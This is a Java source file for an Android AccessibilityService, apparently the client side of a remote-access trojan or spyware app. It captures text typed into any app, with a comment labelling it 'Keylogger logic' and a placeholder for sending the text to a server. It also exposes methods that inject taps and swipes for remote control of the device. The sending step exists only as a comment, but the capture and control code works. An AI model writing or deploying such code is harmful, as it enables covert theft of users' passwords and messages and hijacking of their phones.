package com.wahala.client;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class AccessibilityHelper extends AccessibilityService {
    private static AccessibilityHelper instance;

    @Override
    public void onServiceConnected() {
        instance = this;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            // Keylogger logic
            String text = event.getText().toString();
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
            // Send to server (via static Network instance)
        }
    }

    @Override
    public void onInterrupt() {}

    public static void performClick(float x, float y) {
        if (instance == null) return;
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 50);
        GestureDescription gesture = new GestureDescription.Builder().addStroke(stroke).build();
        instance.dispatchGesture(gesture, null, null);
    }

    public static void swipe(float x1, float y1, float x2, float y2) {
        if (instance == null) return;
        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 200);
        GestureDescription gesture = new GestureDescription.Builder().addStroke(stroke).build();
        instance.dispatchGesture(gesture, null, null);
    }
                                 }
